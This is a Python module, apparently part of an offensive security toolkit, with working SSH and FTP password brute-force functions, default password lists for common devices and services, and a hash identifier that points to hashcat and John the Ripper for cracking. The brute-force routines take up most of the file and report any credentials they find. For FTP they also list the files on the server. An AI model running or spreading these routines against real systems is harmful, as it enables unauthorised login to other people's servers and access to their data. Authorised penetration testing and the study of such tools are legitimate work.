"""
Password attack tools — pure Python.
SSH brute-force (paramiko), FTP brute-force (ftplib), hash identification.
"""

import ftplib
import hashlib
import re

try:
    import paramiko
    PARAMIKO_OK = True
except ImportError:
    PARAMIKO_OK = False


DEFAULT_SSH_PASSWORDS = [
    'root', 'toor', 'admin', 'password', '123456', 'pass', '',
    'admin123', 'letmein', 'qwerty', 'test', 'guest', '1234',
    'raspberry', 'pi', 'ubnt', 'support', 'service', 'default',
]


def ssh_brute(host: str, username: str = "root",
              passwords: str = "", port: int = 22,
              progress_cb=None) -> str:
    lines = []
    def emit(line):
        lines.append(line)
        if progress_cb: progress_cb(line)

    if not PARAMIKO_OK:
        emit("[!] paramiko not installed. Cannot perform SSH brute-force.")
        return "\n".join(lines)

    pwd_list = DEFAULT_SSH_PASSWORDS.copy()
    if passwords:
        extra = [p.strip() for p in passwords.split(',') if p.strip()]
        pwd_list = extra + pwd_list

    emit(f"[*] SSH brute-force: {host}:{port}  user={username}")
    emit(f"[*] Testing {len(pwd_list)} passwords ...")

    for pwd in pwd_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=int(port), username=username,
                           password=pwd, timeout=5, banner_timeout=5,
                           auth_timeout=5, look_for_keys=False,
                           allow_agent=False)
            emit(f"\n[!!!] CREDENTIALS FOUND!")
            emit(f"      Host    : {host}:{port}")
            emit(f"      Username: {username}")
            emit(f"      Password: {pwd}")
            client.close()
            return "\n".join(lines)
        except paramiko.AuthenticationException:
            emit(f"  [-] {username}:{pwd}")
        except Exception as e:
            emit(f"  [!] Error: {e}")
            break

    emit("\n[-] No valid credentials found.")
    return "\n".join(lines)


DEFAULT_FTP_PASSWORDS = [
    'anonymous', '', 'admin', 'password', 'ftp', 'root', '123456',
    'guest', 'test', 'admin123', 'pass', 'ftp123',
]


def ftp_brute(host: str, username: str = "anonymous",
              passwords: str = "", port: int = 21,
              progress_cb=None) -> str:
    lines = []
    def emit(line):
        lines.append(line)
        if progress_cb: progress_cb(line)

    pwd_list = DEFAULT_FTP_PASSWORDS.copy()
    if passwords:
        extra = [p.strip() for p in passwords.split(',') if p.strip()]
        pwd_list = extra + pwd_list

    emit(f"[*] FTP brute-force: {host}:{port}  user={username}")
    emit(f"[*] Testing {len(pwd_list)} passwords ...")

    for pwd in pwd_list:
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, int(port), timeout=8)
            ftp.login(username, pwd)
            emit(f"\n[!!!] CREDENTIALS FOUND!")
            emit(f"      Host    : {host}:{port}")
            emit(f"      Username: {username}")
            emit(f"      Password: {pwd!r}")
            try:
                files = ftp.nlst()[:10]
                emit(f"      Files   : {', '.join(files)}")
            except Exception:
                pass
            ftp.quit()
            return "\n".join(lines)
        except ftplib.error_perm:
            emit(f"  [-] {username}:{pwd}")
        except Exception as e:
            emit(f"  [!] Error: {e}")
            break

    emit("\n[-] No valid credentials found.")
    return "\n".join(lines)


HASH_PATTERNS = {
    r'^\$2[aby]\$\d{2}\$': 'bcrypt',
    r'^\$6\$': 'SHA-512 crypt',
    r'^\$5\$': 'SHA-256 crypt',
    r'^\$1\$': 'MD5 crypt',
    r'^[0-9a-fA-F]{32}$': 'MD5 / NTLM',
    r'^[0-9a-fA-F]{40}$': 'SHA-1',
    r'^[0-9a-fA-F]{64}$': 'SHA-256',
    r'^[0-9a-fA-F]{128}$': 'SHA-512',
}


def hash_identify(hash_str: str, progress_cb=None) -> str:
    lines = []
    def emit(line):
        lines.append(line)
        if progress_cb: progress_cb(line)

    h = hash_str.strip()
    emit(f"[*] Hash Identification")
    emit(f"  Input : {h}")
    emit(f"  Length: {len(h)} chars")
    emit("")

    detected = []
    for pattern, name in HASH_PATTERNS.items():
        if re.match(pattern, h):
            detected.append(name)
            emit(f"  [+] Possible type: {name}")

    if not detected:
        emit("  [?] No known hash pattern matched.")

    emit("")
    emit("  -- Common Tools to Crack --")
    emit("  hashcat -m 0  <hashfile> <wordlist>   (MD5)")
    emit("  hashcat -m 100 <hashfile> <wordlist>  (SHA-1)")
    emit("  john --wordlist=<wordlist> <hashfile>")
    return "\n".join(lines)


def hash_generate(text: str, algorithm: str = "all", progress_cb=None) -> str:
    lines = []
    def emit(line):
        lines.append(line)
        if progress_cb: progress_cb(line)

    emit(f"[*] Hash generation for: {text!r}")
    emit("")
    algos = ['md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512']
    if algorithm != "all" and algorithm in algos:
        algos = [algorithm]
    for algo in algos:
        h = hashlib.new(algo, text.encode()).hexdigest()
        emit(f"  {algo.upper():10s}: {h}")
    return "\n".join(lines)
